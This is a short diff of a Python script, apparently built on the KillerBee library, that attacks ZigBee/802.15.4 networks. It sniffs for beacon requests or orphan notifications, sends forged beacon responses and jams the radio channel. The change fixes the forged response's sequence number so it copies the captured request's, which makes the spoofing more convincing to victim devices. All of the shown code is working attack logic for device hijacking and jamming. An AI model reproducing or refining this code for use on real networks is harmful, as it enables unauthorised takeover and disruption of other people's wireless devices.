@@ -76,14 +76,12 @@ if __name__ == '__main__':
                                 str(BEACON_RESPONSE_LISTEN_TRIES) + ' tries. Resending request...')
             kb.sniffer_off()
 
-        # Update timestamp
-        beacon_response_bytes[2] = (beacon_response_bytes[2]+3) % 256
-
         # Wait for another beacon request
         print('3. Listening for a beacon request or orphan notification from another device...')
         got_beacon_request = False
         counter = 1
         kb.sniffer_on()
+        br_seq_num = 0
         while not got_beacon_request:
             packet = kb.pnext()
             if packet:
@@ -94,10 +92,14 @@ if __name__ == '__main__':
                         (len(packet_bytes) > 17 and packet_bytes[17] == 0x06))):
                     print('  Got beacon request or orphan notification.')
                     got_beacon_request = True
+                    br_seq_num = packet_bytes[2]
                 else:
                     print('  Ignoring packet (' + str(counter) + '): not beacon request or orphan notification.')
                     counter += 1
         kb.sniffer_off()
+
+        # Update timestamp
+        beacon_response_bytes[2] = (br_seq_num+1) % 256
 
         # Jam for 0.4 sec
         print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
